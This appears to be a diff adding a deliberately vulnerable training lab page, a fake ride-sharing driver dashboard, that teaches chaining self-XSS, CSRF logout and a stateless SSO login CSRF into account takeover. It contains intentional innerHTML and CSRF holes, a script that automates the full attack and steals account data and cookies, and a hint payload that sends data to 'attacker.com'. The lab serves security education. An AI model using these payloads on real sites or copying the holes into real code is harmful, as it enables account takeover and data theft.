@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RideMetric — Partner Dashboard</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:#fafafa;color:#171717}
+    .nav{background:#000;color:#fff;height:56px;display:flex;align-items:center;padding:0 24px;justify-content:space-between}
+    .nav .brand{font-weight:800;font-size:17px;display:flex;align-items:center;gap:8px}.nav .brand em{color:#22c55e;font-style:normal}
+    .nav .links{display:flex;gap:22px;font-size:13px}.nav .links a{color:#a3a3a3;text-decoration:none;font-weight:500}.nav .links a.active{color:#22c55e}.nav .links a:hover{color:#fff}
+    .nav .right{display:flex;align-items:center;gap:10px;font-size:13px;color:#a3a3a3}
+    .nav .avatar{width:28px;height:28px;border-radius:50%;background:#22c55e;color:#000;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px}
+    .container{max-width:1100px;margin:30px auto;padding:0 24px}
+    .hero{background:linear-gradient(135deg,#22c55e 0%,#15803d 100%);color:#fff;border-radius:16px;padding:32px;margin-bottom:20px;display:grid;grid-template-columns:1fr auto;gap:20px;align-items:center}
+    .hero h1{font-size:24px;font-weight:800;margin-bottom:6px}.hero p{font-size:14px;opacity:0.9}
+    .hero-stats{display:flex;gap:16px}
+    .hs{background:rgba(0,0,0,0.2);padding:12px 18px;border-radius:10px;text-align:center}
+    .hs .v{font-size:20px;font-weight:800}.hs .k{font-size:11px;opacity:0.8}
+    .grid{display:grid;grid-template-columns:2fr 1fr;gap:16px}
+    .card{background:#fff;border:1px solid #e5e5e5;border-radius:12px;padding:22px;margin-bottom:14px}
+    .card h2{font-size:16px;font-weight:700;margin-bottom:4px}.card .sub{font-size:12px;color:#737373;margin-bottom:14px}
+    .ride-row{display:flex;padding:10px 0;border-bottom:1px solid #f5f5f5;font-size:13px;align-items:center;gap:10px}.ride-row:last-child{border-bottom:none}
+    .ride-row .route{flex:1;color:#404040}.ride-row .fare{font-weight:700;color:#171717}.ride-row .status{font-size:10px;padding:2px 8px;border-radius:4px;font-weight:600}
+    .status.ok{background:#dcfce7;color:#15803d}.status.pending{background:#fef3c7;color:#92400e}
+    label{display:block;font-size:12px;font-weight:600;color:#404040;margin-bottom:4px}
+    textarea,input{width:100%;padding:10px 14px;border:1px solid #d4d4d4;border-radius:8px;font-size:13px;font-family:inherit;margin-bottom:10px}
+    textarea{min-height:80px;resize:vertical}textarea:focus,input:focus{outline:none;border-color:#22c55e;box-shadow:0 0 0 3px rgba(34,197,94,0.12)}
+    .btn{padding:8px 16px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;border:none}.btn-primary{background:#22c55e;color:#000}.btn-primary:hover{background:#16a34a;color:#fff}.btn-secondary{background:#f5f5f5;color:#404040;border:1px solid #d4d4d4}.btn-secondary:hover{background:#e5e5e5}.btn-danger{background:#dc2626;color:#fff}
+    .bio-render{background:#f5f5f5;border-radius:8px;padding:14px;margin-top:10px;font-size:13px;color:#404040;min-height:40px}
+    .kv{font-family:monospace;font-size:12px;color:#404040;word-break:break-all}
+    #login-wall{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:9999}
+    .lf{background:#171717;border:1px solid #262626;padding:36px;border-radius:16px;width:360px;color:#fafafa}
+    .lf h2{font-size:22px;color:#22c55e;margin-bottom:2px}.lf .sub{font-size:13px;color:#737373;margin-bottom:18px}
+    .lf input{width:100%;padding:10px 14px;background:#000;border:1px solid #262626;border-radius:8px;color:#fafafa;font-size:14px;margin-bottom:10px}
+    .lf button{width:100%;padding:10px;background:#22c55e;color:#000;border:none;border-radius:8px;font-weight:700;cursor:pointer;font-size:14px}
+    .lf .tip{font-size:11px;color:#525252;margin-top:10px;text-align:center;line-height:1.5}
+    .hidden{display:none !important}
+    .toast{position:fixed;bottom:20px;right:20px;padding:12px 18px;border-radius:10px;font-size:13px;font-weight:500;background:#000;color:#fff;display:none;z-index:500;box-shadow:0 4px 16px rgba(0,0,0,0.15)}
+    .toast.show{display:block;animation:slide 0.3s ease}@keyframes slide{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
+    .toast.err{background:#991b1b}
+  </style>
+</head>
+<body>
+
+  <div id="login-wall">
+    <div class="lf">
+      <h2>RideMetric Partners</h2>
+      <div class="sub">Driver dashboard</div>
+      <input type="text" id="u" placeholder="Username" value="driver-alex">
+      <input type="password" id="p" placeholder="Password" value="password123">
+      <button onclick="doLogin()">Sign In</button>
+      <div class="tip">
+        Drivers: <code>driver-alex</code> / <code>password123</code><br>
+        Attacker account: <code>attacker-zero</code> / <code>attacker123</code>
+      </div>
+    </div>
+  </div>
+
+  <nav class="nav">
+    <div class="brand"><em>Ride</em>Metric</div>
+    <div class="links">
+      <a href="#" class="active">Dashboard</a>
+      <a href="#">Rides</a>
+      <a href="#">Earnings</a>
+      <a href="#">Support</a>
+    </div>
+    <div class="right">
+      <span id="nav-name">—</span>
+      <div class="avatar" id="nav-avatar">?</div>
+      <button class="btn btn-secondary" style="font-size:11px;padding:5px 10px" onclick="rmLogout()">Sign out</button>
+    </div>
+  </nav>
+
+  <div class="container">
+    <div class="hero">
+      <div>
+        <h1>Welcome back, <span id="hero-name">...</span></h1>
+        <p>Here's your partner activity this week</p>
+      </div>
+      <div class="hero-stats">
+        <div class="hs"><div class="v" id="stat-earn">$—</div><div class="k">Earnings</div></div>
+        <div class="hs"><div class="v" id="stat-rides">—</div><div class="k">Rides</div></div>
+      </div>
+    </div>
+
+    <div class="grid">
+      <div>
+        <div class="card">
+          <h2>Recent Rides</h2>
+          <div class="sub">Last 7 days</div>
+          <div class="ride-row"><div class="route">SFO → Downtown</div><div class="fare">$42.50</div><div class="status ok">Paid</div></div>
+          <div class="ride-row"><div class="route">Mission → Marina</div><div class="fare">$18.20</div><div class="status ok">Paid</div></div>
+          <div class="ride-row"><div class="route">Oakland → SFO</div><div class="fare">$56.80</div><div class="status ok">Paid</div></div>
+          <div class="ride-row"><div class="route">SoMa → Bay Area</div><div class="fare">$31.40</div><div class="status pending">Pending</div></div>
+          <div class="ride-row"><div class="route">Richmond → Castro</div><div class="fare">$24.10</div><div class="status ok">Paid</div></div>
+        </div>
+
+        <div class="card">
+          <h2>Your Profile Bio</h2>
+          <div class="sub">Shown to dispatchers and customers. Supports basic formatting.</div>
+          <form onsubmit="saveBio(event)">
+            <label>Bio</label>
+            <textarea id="bio-input" placeholder="Tell riders about yourself..."></textarea>
+            <button type="submit" class="btn btn-primary">Save Bio</button>
+            <button type="button" class="btn btn-secondary" onclick="loadMyProfile()">Preview</button>
+          </form>
+          <div class="bio-render" id="bio-preview">
+            <em style="color:#a3a3a3">Preview will appear here</em>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <h2>Account Info</h2>
+          <div id="account-info" class="kv">loading...</div>
+        </div>
+        <div class="card">
+          <h2>Quick Actions</h2>
+          <button class="btn btn-secondary" style="width:100%;margin-bottom:6px" onclick="viewProfile(prompt('Username?','attacker-zero'))">View another driver's profile</button>
+          <button class="btn btn-secondary" style="width:100%" onclick="showAttackerHelper()">🧪 Attacker helper (lab only)</button>
+        </div>
+
+        <div class="card" id="attacker-helper" style="display:none;border:2px dashed #dc2626">
+          <h2 style="color:#dc2626">🧪 Attacker Helper</h2>
+          <div class="sub">This panel lives only in the lab. In a real attack everything runs from the attacker's server.</div>
+          <p style="font-size:12px;color:#737373;margin-bottom:10px"><strong>1.</strong> Get a login-CSRF code for <code>attacker-zero</code>. This is a valid SSO code that, when visited, silently logs ANY browser into the attacker's account (because the callback has no state validation).</p>
+          <button class="btn btn-secondary" style="width:100%;margin-bottom:8px" onclick="getAttackerCode()">Generate attacker login code</button>
+          <div id="attacker-code-box" class="kv" style="margin-bottom:10px"></div>
+          <p style="font-size:12px;color:#737373;margin-bottom:8px"><strong>2.</strong> Simulate the victim clicking the attacker's phishing page (this runs the full chain).</p>
+          <button class="btn btn-danger" style="width:100%" id="fire-chain-btn" disabled onclick="fireFullChain()">Fire full chain on the current browser</button>
+          <div id="chain-log" class="kv" style="margin-top:10px;max-height:180px;overflow-y:auto;background:#0a0a0a;color:#22c55e;padding:10px;border-radius:6px;display:none;white-space:pre-wrap"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    var session = { username: null, attacker: false };
+    var state = { attackerCode: null, attackerCallback: null };
+
+    function toast(msg, err) {
+      var t = document.getElementById('toast');
+      t.className = 'toast show' + (err ? ' err' : '');
+      t.textContent = msg;
+      setTimeout(function(){ t.className = 'toast'; }, 3500);
+    }
+
+    function doLogin() {
+      fetch('/ridemetric/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({
+          username: document.getElementById('u').value,
+          password: document.getElementById('p').value
+        })
+      }).then(function(r){ return r.json(); }).then(function(d){
+        if (d.success) {
+          refreshSession();
+        } else {
+          toast('Login failed', true);
+        }
+      });
+    }
+
+    function refreshSession() {
+      fetch('/ridemetric/me', { credentials: 'include' }).then(function(r){
+        if (!r.ok) { document.getElementById('login-wall').classList.remove('hidden'); return Promise.reject(); }
+        return r.json();
+      }).then(function(d){
+        document.getElementById('login-wall').classList.add('hidden');
+        session.username = d.username;
+        session.attacker = (d.username === 'attacker-zero');
+        document.getElementById('hero-name').textContent = d.fullName;
+        document.getElementById('nav-name').textContent = d.fullName;
+        document.getElementById('nav-avatar').textContent = d.fullName[0].toUpperCase();
+        document.getElementById('stat-earn').textContent = '$' + d.earnings.toLocaleString();
+        document.getElementById('stat-rides').textContent = d.rides;
+        document.getElementById('account-info').innerHTML =
+          '<div>Username: <strong>' + d.username + '</strong></div>' +
+          '<div>Email: ' + d.email + '</div>' +
+          '<div>Earnings: $' + d.earnings.toLocaleString() + '</div>' +
+          (session.attacker ? '<div style="color:#dc2626;margin-top:6px;font-weight:700">⚠ You are logged into the ATTACKER account</div>' : '');
+        document.getElementById('bio-input').value = d.bio || '';
+        renderBio(d.bio);
+      }).catch(function(){});
+    }
+
+    function renderBio(bio) {
+      var el = document.getElementById('bio-preview');
+      // VULNERABLE: bio is rendered via innerHTML — self-XSS (only you see your own bio here)
+      el.innerHTML = bio || '<em style="color:#a3a3a3">No bio set</em>';
+    }
+
+    function saveBio(e) {
+      e.preventDefault();
+      var bio = document.getElementById('bio-input').value;
+      fetch('/ridemetric/bio', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ bio: bio })
+      }).then(function(r){ return r.json(); }).then(function(){
+        renderBio(bio);
+        toast('Bio saved');
+      });
+    }
+
+    function loadMyProfile() {
+      if (session.username) viewProfile(session.username);
+    }
+
+    function viewProfile(uname) {
+      if (!uname) return;
+      location.href = '/ridemetric/profile/' + encodeURIComponent(uname);
+    }
+
+    function rmLogout() {
+      // Note: this uses GET, which is CSRF-able
+      fetch('/ridemetric/logout', { credentials: 'include' }).then(function(){
+        session.username = null;
+        document.getElementById('login-wall').classList.remove('hidden');
+      });
+    }
+
+    // ---- Attacker helper (lab only) ----
+    function showAttackerHelper() {
+      document.getElementById('attacker-helper').style.display = 'block';
+    }
+
+    function getAttackerCode() {
+      fetch('/ridemetric/sso/get-code?user=attacker-zero').then(function(r){ return r.json(); }).then(function(d){
+        state.attackerCode = d.code;
+        state.attackerCallback = d.callback;
+        document.getElementById('attacker-code-box').innerHTML =
+          '<div>code: <strong>' + d.code + '</strong></div>' +
+          '<div>login-CSRF URL: <code>' + d.callback + '</code></div>';
+        document.getElementById('fire-chain-btn').disabled = false;
+      });
+    }
+
+    function chainLog(msg, color) {
+      var el = document.getElementById('chain-log');
+      el.style.display = 'block';
+      var line = document.createElement('div');
+      if (color) line.style.color = color;
+      line.textContent = '> ' + msg;
+      el.appendChild(line);
+      el.scrollTop = el.scrollHeight;
+    }
+
+    async function fireFullChain() {
+      var el = document.getElementById('chain-log');
+      el.innerHTML = '';
+      el.style.display = 'block';
+
+      if (!session.username) { chainLog('No active session. Log in as driver-alex first.', '#fca5a5'); return; }
+      if (session.attacker) { chainLog('Already logged in as attacker — switch to the victim (driver-alex)', '#fca5a5'); return; }
+
+      var originalUser = session.username;
+      chainLog('Current session: ' + originalUser, '#86efac');
+
+      // Stage A: attacker plants XSS payload in attacker-zero's bio
+      chainLog('');
+      chainLog('[A] Attacker plants self-XSS in attacker-zero profile');
+      // Temporarily log in as attacker to set bio (in real attack, attacker has done this already from their own machine)
+      await fetch('/ridemetric/login', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'include',
+        body: JSON.stringify({ username: 'attacker-zero', password: 'attacker123' })
+      });
+      // Plant a payload that fires when the bio is rendered via innerHTML
+      var payload = '<img src=x onerror="__ubersxss()">' +
+        '<scr' + 'ipt>window.__ubersxss=function(){' +
+        'fetch(\'/ridemetric/me\').then(r=>r.json()).then(d=>{' +
+        'var msg = {stolen:true, account:d, cookie:document.cookie};' +
+        'window.parent && window.parent.postMessage && window.parent.postMessage({type:\'selfxss:result\',data:msg},\'*\');' +
+        '});' +
+        '};__ubersxss();</scr' + 'ipt>';
+      await fetch('/ridemetric/bio', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'include',
+        body: JSON.stringify({ bio: payload })
+      });
+      chainLog('    bio payload saved for attacker-zero', '#86efac');
+
+      // Now restore the victim's session so the chain actually demonstrates the bug
+      await fetch('/ridemetric/login', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'include',
+        body: JSON.stringify({ username: originalUser, password: 'password123' })
+      });
+      chainLog('    restored victim session: ' + originalUser, '#86efac');
+
+      // Stage B: log the victim out (CSRF)
+      chainLog('');
+      chainLog('[B] CSRF the logout endpoint (GET /ridemetric/logout)');
+      await fetch('/ridemetric/logout', { credentials: 'include' });
+      chainLog('    victim logged out', '#86efac');
+
+      // Stage C: CSRF-login the victim into the attacker account via the SSO callback
+      chainLog('');
+      chainLog('[C] CSRF-login the victim into attacker-zero via /sso/callback?code=...');
+      chainLog('    (no state param → no CSRF protection on login)');
+      await fetch(state.attackerCallback, { credentials: 'include', redirect: 'follow' });
+      chainLog('    code ' + state.attackerCode + ' burned; victim session now = attacker-zero', '#86efac');
+
+      // Stage D: fetch attacker's profile in an iframe — self-XSS fires in victim's browser
+      chainLog('');
+      chainLog('[D] Load attacker profile — XSS fires in victim browser');
+
+      // Listen for the exfil postMessage from the iframe
+      var exfilPromise = new Promise(function(resolve) {
+        var handler = function(ev) {
+          if (ev.data && ev.data.type === 'selfxss:result') {
+            window.removeEventListener('message', handler);
+            resolve(ev.data.data);
+          }
+        };
+        window.addEventListener('message', handler);
+        setTimeout(function(){ resolve(null); }, 4000);
+      });
+
+      // Inject iframe targeting attacker profile
+      var oldIframe = document.getElementById('xss-iframe');
+      if (oldIframe) oldIframe.remove();
+      var iframe = document.createElement('iframe');
+      iframe.id = 'xss-iframe';
+      iframe.style.cssText = 'width:100%;height:220px;border:1px solid #e5e5e5;border-radius:8px;margin-top:10px';
+      iframe.src = '/ridemetric/profile/attacker-zero';
+      document.getElementById('chain-log').appendChild(iframe);
+
+      var exfil = await exfilPromise;
+      if (exfil) {
+        chainLog('    EXFIL received via postMessage:', '#fca5a5');
+        chainLog('    ' + JSON.stringify(exfil.account, null, 2), '#fca5a5');
+      } else {
+        chainLog('    (iframe bio also reads directly — checking)', '#fde047');
+        try {
+          var bioEl = iframe.contentDocument.querySelector('.bio-content');
+          chainLog('    bio rendered: ' + (bioEl ? bioEl.innerHTML.substring(0, 100) : '(none)'));
+        } catch(e) { chainLog('    cross-doc access blocked: ' + e.message, '#fca5a5'); }
+      }
+
+      // Stage E: silently log victim back into their own account — they never noticed
+      chainLog('');
+      chainLog('[E] Silently log victim back into their own account');
+      await fetch('/ridemetric/login', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'include',
+        body: JSON.stringify({ username: originalUser, password: 'password123' })
+      });
+      chainLog('    victim restored: ' + originalUser, '#86efac');
+      chainLog('');
+      chainLog('*** CHAIN COMPLETE — Self-XSS escalated to cross-user exfil ***', '#fca5a5');
+
+      refreshSession();
+      if (typeof solveLab === 'function') solveLab('chain-uber-selfxss');
+    }
+
+    // Auto-init
+    refreshSession();
+  </script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: Self-XSS → Login CSRF → ATO</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">This is the <a href="https://whitton.io/articles/uber-turning-self-xss-into-good-xss/" style="color:#3b82f6">Whitton/Uber classic</a>. Self-XSS alone is noise. Chain it with a login CSRF and you land the stored XSS inside the victim's browser. The "attacker helper" button on the dashboard runs the whole thing — but try to piece together the bugs yourself first.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">1</div><span>Map the bugs</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <strong>Bug A — stored self-XSS</strong> in the bio field. Rendered via <code>innerHTML</code>. But you can only edit your own bio, so it fires only in your own browser.<br><br>
+          <strong>Bug B — logout is GET-based and has no CSRF token.</strong> Any cross-origin image/fetch to <code>/ridemetric/logout</code> ends the victim's session.<br><br>
+          <strong>Bug C — SSO login callback has no state parameter.</strong> <code>/ridemetric/sso/callback?code=XYZ</code> silently logs the browser into whatever user that code was issued for. No user interaction.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">2</div><span>The core insight</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Self-XSS fires in YOUR own browser when YOU view YOUR own profile. So if you can force the victim's browser to be logged in as YOU (the attacker), when they load YOUR profile page, YOUR XSS fires in THEIR browser context. That's the "turn self-XSS into real XSS" trick.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">3</div><span>Assemble the sequence</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          (a) Plant stored XSS in attacker-zero's bio (done once, from your own machine).<br>
+          (b) Grab a valid SSO code for attacker-zero that has not been used.<br>
+          (c) Phishing page: <code>&lt;img src="/ridemetric/logout"&gt;</code> + navigate to <code>/ridemetric/sso/callback?code=&lt;attacker_code&gt;</code>.<br>
+          (d) Follow with <code>location = '/ridemetric/profile/attacker-zero'</code> — XSS runs in victim's browser inside <strong>attacker-zero</strong>'s session.<br>
+          (e) XSS payload logs victim back into their original account (optional if you harvested enough already) and exfils data.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">4</div><span>Payload ideas for the bio</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Once XSS fires in the victim's browser while logged-in as attacker-zero, you need to switch them back and exfil. Example:
+          <pre><code>&lt;img src=x onerror="
+  // we are running on /ridemetric/profile/attacker-zero
+  // iframe the victim's original account data via same-origin session swap
+  fetch('/api/auth/me', {credentials:'include'}).then(r=&gt;r.json()).then(d=&gt;{
+    navigator.sendBeacon('//attacker.com/log', JSON.stringify(d));
+  });
+"&gt;</code></pre>
+          In a real attack, you'd pre-log-them-out → re-log them INTO attacker → iframe their original profile after you re-log them back in. The attacker helper button automates this end-to-end.
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Run the automated chain</button>
+        <div class="hint-spoiler-content">
+          <p>Scroll down on the right sidebar → click <strong>🧪 Attacker helper</strong>.</p>
+          <p>1. Click "Generate attacker login code" — backend issues a code for <code>attacker-zero</code>.</p>
+          <p>2. Click "Fire full chain on the current browser". The lab will:</p>
+          <ul style="margin:6px 0 6px 18px;font-size:13px">
+            <li>Plant the XSS payload in attacker-zero's bio</li>
+            <li>CSRF-logout the victim</li>
+            <li>Login-CSRF into attacker-zero via the stateless SSO callback</li>
+            <li>Iframe the attacker profile → self-XSS fires in victim's browser</li>
+            <li>XSS payload exfils and postMessages back to the dashboard as proof</li>
+            <li>Restore the victim's original session</li>
+          </ul>
+          <p>You'll see the exfil (username, email, earnings) appear in the log. Lab solved.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('chain-uber-selfxss', 'xss');
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
+  </script>
+</body>
+</html>
